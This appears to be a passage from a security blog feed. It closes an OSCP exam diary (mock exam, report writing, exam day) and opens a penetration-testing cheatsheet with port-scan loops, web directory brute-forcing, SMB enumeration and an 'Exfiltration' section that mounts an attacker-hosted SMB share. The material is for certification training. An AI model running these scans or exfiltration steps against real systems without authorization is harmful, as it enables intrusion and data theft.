+&lt;p>Personally for me, the labs are similar and at the same time different to Hack The Box, why? Because the labs are sort of like &amp;ldquo;real&amp;rdquo; basic nets, in the sense that there is a dependence between some hosts, you can&amp;rsquo;t get one without first compromising another or even get to enumerate/discover other hosts, without first compromising N firewalls, the fact that there is nothing written, that you need to discover which host has dependence with which host, for me was really fun. Also in this aspect, it really helped having experience as sysadmin maintaining large amounts of servers across multiple networks, because in scale PWK nets were really small ones and without normal components you find in a real network, again basic &amp;ldquo;real&amp;rdquo; nets.&lt;/p>
+&lt;p>On the other hand, the OSCP Exam itself, yes it is really HTB-like, you are given N machines, every machine having specific points, there are no dependencies, there is no looting needed, the only thing that is needed is to break independent machines, tl;dr: enumerate, enumerate, enumerate&amp;hellip;enumerate, try, try harder, keep trying, repeat.&lt;/p>
+&lt;p>&lt;strong>Now, one important point about PWK/OSCP vs HTB, with PWK/OSCP you pretty much 99% of the time will find a CVE (or just a public POC on exploit-db) for what you are trying to break, while HTB tends to be more misconfigurations and/or CTF stuff, this makes a lot of stuff on HTB harder than PWK/OSCP&lt;/strong>&lt;/p>
+&lt;h2 id="011-20200411---the-mock-exam">011: 20200411 - The Mock Exam&lt;/h2>
+&lt;p>During the whole PWK, my biggest worry, was not breaking machines itself, no, it was two things:&lt;/p>
+&lt;ul>
+&lt;li>The report&lt;/li>
+&lt;li>The proctored exam&lt;/li>
+&lt;/ul>
+&lt;p>This was going to be the first time in my life needing to write down a report of something like an exam in english (english, is not my native language, and as I&amp;rsquo;m self-teaching I lack a lot of stuff), so this was enough to put me in some sort of panic state, it was going to be so, so, so easy to fuck it up, I mean, I&amp;rsquo;m sure while you are reading this, a lot of stuff had made your eyes cry because something is WRONG, so just imagine how much worried I was in this aspect!!&lt;/p>
+&lt;p>And the second, the proctored exam, I&amp;rsquo;m good at working under pressure (I worked under strict SLAs), but doing something with a deadline of 24 hs as OSCP is, while &lt;em>being watched&lt;/em> that whole time? Personally for me, that was just a totally new thing, and one that made me to creep &lt;em>A LOT&lt;/em>.&lt;/p>
+&lt;p>To deal with those things, I thought about doing a Mock Exam (ONE week before the real one), what do I mean with a mock exam? Basically I was going to pick up 5 random machines from &lt;a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">HTB/Vulnhub OSCP-alike&lt;/a>, and starting at a similar time as the one of my OSCP, hack them in a time frame of 23 hs 45 minutes, if I run out of time and I was not able to do it, then I was not able to do it, no way around it, on top of this to get used to the proctoring I was going to do a live stream on youtube for the whole time I needed to get the machines or until running out of time, whichever happend first.
+For the report itself, I gave me more freedom with it, the aim yes, was to do something similar to what I should submit to Offensive Security, but as this was a completely new thing, and more easy for me to fuck up, I thought of it more as a learning experience, so no, no deadlines to do it. I&amp;rsquo;m really grateful of doing it, because I ended indeed learning quite a lot about the process of what is worth to document, what is not, what I should I avoid, what notes &lt;em>I MUST&lt;/em> always have to write down, etc.&lt;/p>
+&lt;h4 id="00---the-live-streaming">00 - The Live Streaming&lt;/h4>
+&lt;p>Days before the exam I asked to be chosen random machines from the list of alike-ones (link above in HTB/Vulnhub alike) and assign points to them, the list ended like this:&lt;/p>
+&lt;ul>
+&lt;li>Brainpan - 25 pts - BOF&lt;/li>
+&lt;li>Bart - 25 pts&lt;/li>
+&lt;li>Lightweight - 20 pts&lt;/li>
+&lt;li>Arctic - 20 pts&lt;/li>
+&lt;li>Optimum - 10 pts&lt;/li>
+&lt;/ul>
+&lt;p>Something important to remark, the windows machine I used to the development of the exploit (BOF) was a free one provided by Microsoft that has a valid time of 3 months, so more than enough for this, it can be downloaded here:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
+&lt;/code>&lt;/pre>&lt;p>Finally, the 2020/04/11 I started doing a livestream on youtube, and ended rooting all the machines in around 14 hs. &lt;strong>Worth to mention I cut the live stream at around those 14 hs, but youtube only uploaded 12 hs of video, this also was the first time I was streaming something and I didn&amp;rsquo;t know OBS by default didn&amp;rsquo;t do a recording of the videos while streaming, so I don&amp;rsquo;t have the original video to upload the 2 hs missing, but if wanted I just can record that missing parts&lt;/strong>, said that, the streaming:&lt;/p>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+&lt;iframe src="https://www.youtube.com/embed/FwZc6JigIcE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video">&lt;/iframe>
+&lt;/div>
+&lt;h4 id="01---note-taking">01 - Note Taking&lt;/h4>
+&lt;p>When I started my notes were pure shit, I&amp;rsquo;m sure they still are, but are way better than what they were before. For taking/keeping notes through all the PWK and OSCP, I used Cherrytree, I started with &lt;a href="https://411hall.github.io/assets/files/CTF_template.ctb">this template&lt;/a>, but as I moved forward and my own methodology started to develop I modified some stuff, the result was having this template:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">https://ceso.github.io/files/oscp/template_pwk.ctb
+&lt;/code>&lt;/pre>&lt;p>&lt;strong>Note:&lt;/strong> Something I didn&amp;rsquo;t know during the exam, is that in the past some pepole has lost their notes of Cherrytree because the files got corrupted, then they were unable to prepare their reports, my advice then is, maybe start with Cherrytree, and as time moves on, switch to some another tool for notetaking, such as &lt;a href="https://joplinapp.org/">joplin&lt;/a> or &lt;a href="https://notion.so/">Notion&lt;/a> to mention two examples, you will already have some methodology developed or starting to, so it will be easier to create a template adapted to yourself.&lt;/p>
+&lt;h4 id="10---the-report">10 - The Report&lt;/h4>
+&lt;p>Now, for the report I decided to ditch the doc/.odf templates and just go with something I&amp;rsquo;m more comfortable: Markdown.
+For that I ended using the &lt;a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">template created by noraj&lt;/a>, which using Eisvogel and LaTeX, the markdown is converted to .pdf.
+Keep in mind that this has some &lt;em>HEAVY&lt;/em> requirements when it comes to packages, you need to install around 5 GB and I was too lazy to be honest for figuring out exactly which what packages were needed.
+In summary you need to install &lt;a href="https://pandoc.org/installing.html">pandoc&lt;/a>, &lt;a href="https://github.com/Wandmalfarbe/pandoc-latex-template#required-latex-packages">LaTeX&lt;/a> and the &lt;a href="https://github.com/Wandmalfarbe/pandoc-latex-template/blob/master/eisvogel.tex">Eisvogel template&lt;/a>. Having that done is just a matter of edition with your favourite text editor, I used VS Code.
+If you want to read a bit more in deep about this, I recommend you to read &lt;a href="https://www.tagnull.de/post/oscp-reporting/">this post by 0x41&lt;/a>, or watch the following video by John Hammond talking about this subject:&lt;/p>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+&lt;iframe src="https://www.youtube.com/embed/MQGozZzHUwQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video">&lt;/iframe>
+&lt;/div>
+&lt;p>This is the PDF report of the simulation done at the Live Streaming on Youtube:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.pdf
+&lt;/code>&lt;/pre>&lt;p>And this, is the markdown code to generate the PDF above:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.md
+&lt;/code>&lt;/pre>&lt;h2 id="100-20200418---the-big-day">100: 20200418 - The Big Day&lt;/h2>
+&lt;p>After the simulation, the big day of the exam just arrived, 2020/04/18 at 15 hs started my exam. I didn&amp;rsquo;t do any kind of weird preparation for it, more than keeping a Cherrytree template with the 5 machines ready before the exam (using the one I posted above hosted on this blog), set a sharing folder between my host machine and kali (for not in the world, I wanted something crashing and end up losing everything just because I write only inside the VM), kept ready the templates on markdown for the report of the exam, and a FULL NIGHT OF SLEEP the day before (which I asked as day-off).&lt;/p>
+&lt;p>Describing now my exam, it went as follows:&lt;/p>
+&lt;p>I left running in parallel 4 Full NMaps against all the machines except for the one of the BOF and the Development one for it.
+Afterwards I proceeded to start with the BOF really confident about it while the nmaps run, I got confused counting badchars, and ended spending quite some time on this&amp;hellip;took me more than what it should. Once I was finished with the BOF, I jumped straight into reading the results of the nmaps.&lt;/p>
+&lt;p>Five hours after starting the exam, I was feeling really blue, I didn&amp;rsquo;t got anything else than the BOF, was enumerating the two 20 points, in one I found a public exploit but no matter what I was trying, I couldn&amp;rsquo;t make it to work, and the other one, I was extremely in a tunnel vision because I was not able to bypass a filter, this last thing I tried for over 3 hs I think or even more, I was feeling really really bad. The hours keep going and still, only BOF, only 25 pts, more than 5/7 hs used, and still nothing else, I stopped to have some dinner and try to cool down, once I came back I kept aside the the one for bypassing the filter and BANG ended in a post of 0xdf where he referenced an alternative exploit for the software I was trying to exploit in the 20 pts machine, and&amp;hellip;foothold! it worked at first, I was still feeling pretty bad, I was going to lose&amp;hellip;
+I returned to the one with the bypass and, suddenly I realized what I was trying was a rabbit-hole, and literally the first thing I tried hours before was the way to go, I only didn&amp;rsquo;t notice it worked at that time, awesome! in less than 1 hour or 2 I got user on the two 20 machines, the landscape started to be nice a gain. One or two hours later, I was submitting the proof of root of one of those 20 pts machine, now I had under my score 45 pts, with 25 more I was going to be able to pass&amp;hellip;BUT nothing is always so nice&amp;hellip;I ended spending ALL the night trying to get root in the remaining 20 pts machine, when I realized outside was already daylight again, it was around 7 am, my mental strenght was like shit, my mood was extremly blue, I was convinced I was going to fail the exam, only thing I wanted was to sleep, was to give up, and even maybe not taking a 2nd attempt again, the mix between feling sososo tired plus feeling so stupid because the performance I was having while on the simulation it went that good, it was raping me, I gave up and stopped to take a nap of around 1 h or 1 and half, once I woke up I came back to keep trying this root on the remaining 20 pts, no luck, I was destroyed, I was extremly sad, again&amp;hellip;gave up with this machine and thought about tring the 10 pts to at least have something more, around 30 - 40 minutes later, 10 points more to the score, ok great it&amp;rsquo;s 55 pts, is still NOT enough to pass the exam, I guess I will just try to get at least until user on the 25 pts, to have a bit more of confident with myself&amp;hellip;&amp;ldquo;I tried, I tried&amp;rdquo;, 2 hours later I had submitted the proof of the 25 machine, my mood literally changed, I was &amp;ldquo;re-charged&amp;rdquo; again, I had 80 pts, now I was sure I was able to pass, I couldn&amp;rsquo;t belive it, restarted the machine and did this step once more to confirm it and YES, I indeed rooted it, I was now in the other side, but now with this re-charged mood, having enough points, I decided to keep fighting until the end, to try until the very end of the exam to see if I was able to root the remaining 20 pts machine, found quite a lot of stuff, nothing though that gave me the privilege escalation I needed.
+I decided was the time to have some refresh, stopped this and just started to re-do all the prior machines, to be sure the vectors were totally correct and 100% reproducible, that I had all the documentation about them that I needed, AND that I have had submitted the flags correctly, I&amp;rsquo;m extremely glad I did this last thing, because I noticed I submitted the root proof of the 20 machines I rooted, in the one that no.
+Once ended with this, I came back to the game trying the root on the remaining 20 pts&amp;hellip;hours later the exam had ended, but at least with enough points to pass, getting access to 5 out of 5, and without using my metasploit allowance :P (saved it, and never used it lol).&lt;/p>
+&lt;p>I took a nap of around 1 hour, and I had some lunch, from this I started to work on my report, when I realized I had it finished at 4 am, I reviewed it around 4 or 5 times, and went to sleep. Next day I did some more reviews and finally submitted it around 10 am, so between the 18 and 20, I only slept around 5/6 hs with luck.&lt;/p>
+&lt;p>Through all the exam, I took a lot of short rests of sometimes 10 minutes, sometimes 30 minutes, at some moments every 2 hours at others every 3 hours, you will notice when you need to take a break, just make sure you take them, don&amp;rsquo;t let your self fall into the tempting of not doing it, thinking it will save you time, a break is important as keep pushing.&lt;/p>
+&lt;p>Talking a bit on the official chat of HTB, I was told that all the community thinks that when you get half-user, that&amp;rsquo;s half the points, so I ended with the thought I got 90 pts (instead the 80 I thought at first), as the remaining 20 pts, I got the user, but not the root (even if I wasn&amp;rsquo;t able to do PE, in my report I included all my findings and personal thoughts about it).&lt;/p>
+&lt;img src="https://ceso.github.io/images/blog/oscp/certificate.jpg" class="center" style="border-radius: 8px;" />
+&lt;h2 id="101-cheatsheet">101: Cheatsheet&lt;/h2>
+&lt;p>Something that I found really helpful during the exam, is the &lt;a href="https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/">cheatsheet&lt;/a> I made along the course as also all the different resources I normally tend to go looking for some references stuff (for example PayloadAllTheThings), you can find a direct link to my Cheatsheet always in the upper right corner of the blog.&lt;/p>
+&lt;p>Take cheatsheets from other people, start figuring out what stuff is the one you use the more, what&amp;rsquo;s helpfull, what is granted you will not remember, try to develop your own as you progress to the labs, it is really helpfull and also helps to &amp;ldquo;solidify&amp;rdquo; more the stuff in your mind.&lt;/p>
+&lt;h2 id="110-a-look-into-the-future">110: A look into the future&lt;/h2>
+&lt;p>Yesterday 2020/04/26 I woke up having a message from Off Sec saying I passed, such a good way to wake up, passing OSCP at my first attempt during one of the most shitty moments I have ever lived :).
+Now from here, my plans are keep learning more and more as I can about Infosec (HTB FTW), my next goal is to learn some basics of Binary Analysis/Reverse Engineering as also learn more in deep about Active Directory attacks as attacks to Clouds (either AWS/Azure/GCP), whichever it is, there is going to be a huge puzzle ahead, a neverending learning, and is there anything better than that? I don&amp;rsquo;t really think so&amp;hellip;&lt;/p>
+&lt;p>Thanks for reading until the end in case you were able to, and again as said at the beginning I really didn&amp;rsquo;t want to do a &amp;ldquo;normal post&amp;rdquo;, but more something of my own reflecting how do I feel and stuff I love to do. The name of the title is a reference to the chapter of a book, one I really like, and also I felt it goes well with this new world I&amp;rsquo;m trying to move, one where everything tends to be &amp;ldquo;dark&amp;rdquo; either from the impact it has on media (where terms are wrong used), and also I see it as a synonym of &amp;ldquo;deep&amp;rdquo;, being there are some concepts that you need to &amp;ldquo;dig deep&amp;rdquo; to where is &amp;ldquo;dark&amp;rdquo; for stuff to click.&lt;/p>
+&lt;h2 id="111-one-last-tip">111: One last tip&lt;/h2>
+&lt;p>Keep Trying, but keep trying harder, when you think there is no light and no hope, just don&amp;rsquo;t give up, a lot of stuff can change in a few hours (I know it myself :P).
+Don&amp;rsquo;t think of &amp;ldquo;Try Harder&amp;rdquo; as you need to exprime more your brain, but as don&amp;rsquo;t giving up and giving all you have until the very last second if is needed, of course trying to not get burn out and keeping in mind you are doing it for fun, because you enjoy it.
+Take rests, eat, be aware what you are lacking on your documentation and what is excessing, learn to be self-aware of your weakness (mind SQLI and Windows).&lt;/p>
+&lt;p>&lt;strong>But again most important: Keep trying harder!!&lt;/strong>&lt;/p>
+&lt;p>&lt;em>Note: Please let me know any fix needed on the text or whatever, it also helps to keep improving my english :P&lt;/em>&lt;/p></description></item><item><title>Hacking/OSCP cheatsheet</title><link>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</link><pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</guid><description>&lt;h1 id="hackingoscp-cheatsheet">Hacking/OSCP Cheatsheet&lt;/h1>
+&lt;p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
+But this is basically the tools I tend to relie and use in this way the most.
+Hope is helpfull for you!&lt;/p>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;h3 id="network-discoverie">Network discoverie&lt;/h3>
+&lt;h4 id="nmap">Nmap&lt;/h4>
+&lt;p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">nmap -sV -O --top-ports 50 --open -oA nmap/initial &amp;lt;ip or cidr&amp;gt;
+nmap -sC -sV -O --open -p- -oA nmap/full &amp;lt;ip or cidr&amp;gt;
+nmap -sU -p- -oA nmap/udp &amp;lt;ip or cidr&amp;gt;
+--top-ports only scan the N most common ports
+--open only show open ports
+-sC use the default scripts
+-sV detect versions
+-O detect Operating Systems
+-p- scan all the ports
+-oA save the output in normal format, grepable and xml
+-sU scan UDP ports
+&lt;/code>&lt;/pre>&lt;p>Is also possible to specify scripts or ports:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">nmap --scripts vuln,safe,discovery -p 443,80 &amp;lt;ip or cidr&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">nmap -Pn --top-ports 50 --open -oA nmap/initial &amp;lt;ip or cidr&amp;gt;
+&lt;/code>&lt;/pre>&lt;h3 id="ports-discovery-without-nmap">Ports discovery (without nmap)&lt;/h3>
+&lt;h4 id="nc--bash">nc + bash&lt;/h4>
+&lt;p>If you get in a machine that doesn&amp;rsquo;t have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">top10&lt;span style="color:#f92672">=(&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> &lt;span style="color:#ae81ff">25&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> &lt;span style="color:#ae81ff">110&lt;/span> &lt;span style="color:#ae81ff">139&lt;/span> &lt;span style="color:#ae81ff">443&lt;/span> &lt;span style="color:#ae81ff">445&lt;/span> 3389&lt;span style="color:#f92672">)&lt;/span>; &lt;span style="color:#66d9ef">for&lt;/span> i in &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>top10[@]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>; &lt;span style="color:#66d9ef">do&lt;/span> nc -w &lt;span style="color:#ae81ff">1&lt;/span> 192.168.30.253 $i &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> echo &lt;span style="color:#e6db74">&amp;#34;Port &lt;/span>$i&lt;span style="color:#e6db74"> is open&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> echo &lt;span style="color:#e6db74">&amp;#34;Port &lt;/span>$i&lt;span style="color:#e6db74"> is closed or filtered&amp;#34;&lt;/span>; &lt;span style="color:#66d9ef">done&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="devtcpipport-or-devudpipport">/dev/tcp/ip/port or /dev/udp/ip/port&lt;/h4>
+&lt;p>Alternatively, is possible to do the same than above but by using the special dev files &lt;code>/dev/tcp/ip/port&lt;/code> or &lt;code>/dev/udp/ip/port&lt;/code> (for example nc is not found):&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">top10&lt;span style="color:#f92672">=(&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> &lt;span style="color:#ae81ff">25&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> &lt;span style="color:#ae81ff">110&lt;/span> &lt;span style="color:#ae81ff">139&lt;/span> &lt;span style="color:#ae81ff">443&lt;/span> &lt;span style="color:#ae81ff">445&lt;/span> 3389&lt;span style="color:#f92672">)&lt;/span>; &lt;span style="color:#66d9ef">for&lt;/span> i in &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>top10[@]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>; &lt;span style="color:#66d9ef">do&lt;/span> &lt;span style="color:#f92672">(&lt;/span>echo &amp;gt; /dev/tcp/192.168.30.253/&lt;span style="color:#e6db74">&amp;#34;&lt;/span>$i&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &amp;gt; /dev/null 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> echo &lt;span style="color:#e6db74">&amp;#34;Port &lt;/span>$i&lt;span style="color:#e6db74"> is open&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> echo &lt;span style="color:#e6db74">&amp;#34;Port &lt;/span>$i&lt;span style="color:#e6db74"> is closed&amp;#34;&lt;/span>; &lt;span style="color:#66d9ef">done&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Taking these last examples, is straightforward to create a dummy script for scan a hole /24 net (for example):&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#!/bin/bash
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>subnet&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;192.168.30&amp;#34;&lt;/span>
+top10&lt;span style="color:#f92672">=(&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> &lt;span style="color:#ae81ff">25&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> &lt;span style="color:#ae81ff">110&lt;/span> &lt;span style="color:#ae81ff">139&lt;/span> &lt;span style="color:#ae81ff">443&lt;/span> &lt;span style="color:#ae81ff">445&lt;/span> 3389&lt;span style="color:#f92672">)&lt;/span>
+&lt;span style="color:#66d9ef">for&lt;/span> host in &lt;span style="color:#f92672">{&lt;/span>1..255&lt;span style="color:#f92672">}&lt;/span>; &lt;span style="color:#66d9ef">do&lt;/span>
+&lt;span style="color:#66d9ef">for&lt;/span> port in &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>top10[@]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>; &lt;span style="color:#66d9ef">do&lt;/span>
+&lt;span style="color:#f92672">(&lt;/span>echo &amp;gt; /dev/tcp/&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>subnet&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">.&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>host&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">/&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>port&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &amp;gt; /dev/null 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> echo &lt;span style="color:#e6db74">&amp;#34;Host &lt;/span>&lt;span style="color:#e6db74">${&lt;/span>subnet&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">.&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>host&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> has &lt;/span>&lt;span style="color:#e6db74">${&lt;/span>port&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> open&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> echo &lt;span style="color:#e6db74">&amp;#34;Host &lt;/span>&lt;span style="color:#e6db74">${&lt;/span>subnet&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">.&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>host&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> has &lt;/span>&lt;span style="color:#e6db74">${&lt;/span>port&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> closed&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">done&lt;/span>
+&lt;span style="color:#66d9ef">done&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="banner-grabbing-without-nmap">Banner grabbing (without nmap)&lt;/h3>
+&lt;p>If nmap didn&amp;rsquo;t grab banners (or is not installed), you can do it with &lt;code>/dev/tcp/ip/port&lt;/code> &lt;code>/dev/udp/ip/port&lt;/code> or by using telnet.&lt;/p>
+&lt;h4 id="devtcpipport-or-devudpipport-1">/dev/tcp/ip/port or /dev/udp/ip/port&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">cat &amp;lt; /dev/tcp/192.168.30.253/22
+SSH-2.0-OpenSSH_6.2p2 Debian-6
+^C pressed here
+&lt;/code>&lt;/pre>&lt;p>For doing it with udp ports is the same, but changing tcp for udp&lt;/p>
+&lt;h4 id="telnet">telnet&lt;/h4>
+&lt;pre>&lt;code class="language-console" data-lang="console">telnet 192.168.30.253 22
+SSH-2.0-OpenSSH_6.2p2 Debian-6
+^C pressed here
+&lt;/code>&lt;/pre>&lt;h3 id="web-directoriefile-scanner">Web directorie/file scanner&lt;/h3>
+&lt;h4 id="gobuster">Gobuster&lt;/h4>
+&lt;p>Scan all the directories/files by extension:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
+&lt;/code>&lt;/pre>&lt;p>For scanning without extensions, just take out the -x&lt;/p>
+&lt;h4 id="nikto">Nikto&lt;/h4>
+&lt;p>Sometimes Nikto shows juicy information, I tend to run it like:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
+&lt;/code>&lt;/pre>&lt;h4 id="fuff">fuff&lt;/h4>
+&lt;p>Web fuzzer, &lt;a href="https://github.com/ffuf/ffuf">you can get fuff here&lt;/a>, it basically bruteforces the dirs.&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
+&lt;/code>&lt;/pre>&lt;h3 id="most-usefull-dictionaries-oscphtb">Most usefull dictionaries (OSCP/HTB)&lt;/h3>
+&lt;pre>&lt;code class="language-console" data-lang="console">/usr/share/wordlists/rockyou.txt
+/usr/share/wordlists/wfuzz/others/common_pass.txt
+In seclists-pkg:
+/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
+/usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+&lt;/code>&lt;/pre>&lt;h3 id="samba">Samba&lt;/h3>
+&lt;h4 id="smbclient">smbclient&lt;/h4>
+&lt;p>Check if there is anonymous login enabled:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">smbclient -L 192.168.24.24
+&lt;/code>&lt;/pre>&lt;h4 id="impacket">impacket&lt;/h4>
+&lt;p>Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">
+/usr/share/doc/python3-impacket/examples/smbclient.py &amp;quot;&amp;quot;@192.168.24.24
+&lt;/code>&lt;/pre>&lt;h4 id="smbmap">smbmap&lt;/h4>
+&lt;p>Check which permissions we have in those shares (if there are):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">smbmap -H 192.168.24.24
+Or having an user:
+smbmap -u ceso -H 192.168.24.24
+&lt;/code>&lt;/pre>&lt;h4 id="version-nmap-didnt-detect-it">Version (nmap didn&amp;rsquo;t detect it)&lt;/h4>
+&lt;p>Sometimes nmap doesn&amp;rsquo;t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.&lt;/p>
+&lt;img src="https://ceso.github.io/images/cheatsheet/smb-version-wireshark.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="exfiltration">Exfiltration&lt;/h2>
+&lt;h3 id="samba-1">Samba&lt;/h3>
+&lt;p>Generate a samba server with Impacket:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">impacket-smbserver tools /home/kali/tools
+&lt;/code>&lt;/pre>&lt;h4 id="mount-in-windows">Mount in Windows&lt;/h4>
+&lt;p>Mounting it in Windows with Powershell:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">New-PSDrive -Name &amp;quot;tools&amp;quot; -PSProvider &amp;quot;Filesystem&amp;quot; -Root &amp;quot;\\192.168.42.42\tools&amp;quot;
+&lt;/code>&lt;/pre>&lt;p>Mounting it without Powershell:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">net use z: \\192.168.42.42\tools&amp;quot;
+&lt;/code>&lt;/pre>&lt;p>On windows, to list mounted shares, either Powershell or without it:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">Powershell: Get-SMBShare
+Without Powershell: net share
+&lt;/code>&lt;/pre>&lt;h4 id="mount-in-linux">Mount in Linux&lt;/h4>
+&lt;p>Is needed to have installed cifs-utils, to install it (in debian based):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">sudo apt-get install cifs-utils
+&lt;/code>&lt;/pre>&lt;p>To mount it:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">sudo mount -t cifs //192.168.42.42/tools ~/my_share/
+&lt;/code>&lt;/pre>&lt;p>To list mounted shares:&lt;/p>
